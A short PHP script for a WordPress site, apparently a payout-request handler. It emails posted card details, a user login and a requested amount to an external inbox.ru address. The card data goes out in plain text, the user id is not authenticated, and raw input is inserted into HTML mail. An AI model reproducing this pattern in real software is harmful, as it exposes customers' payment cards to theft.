<?
require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');
$ida=$_POST['id'];
$user = get_user_by('id',$_POST['id']);
$kto=$user->data->user_login;
$ema='0477@inbox.ru';
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; utf-8\r\n";
$headers .= "From: no-reply@mingming.io\r\n";
$man=$_POST['man'];
$karta=$_POST['ra1'].' '.$_POST['ra2'].'/'.$_POST['ra3'];

$message='Card number is:'.$karta.'<br/>';
$message.='Client # '.$kto.' <a target="_blank" href="https://mingming.io/wp-admin/user-edit.php?user_id='.$ida.'&wp_http_referer=%2Fwp-admin%2Fusers.php">account</a>: ---- Want to get '.$man.'$ from his account';  

mail($ema, "New need money from the MingMing.io!", $message,$headers, "-fwebmaster@mingming.io");

?>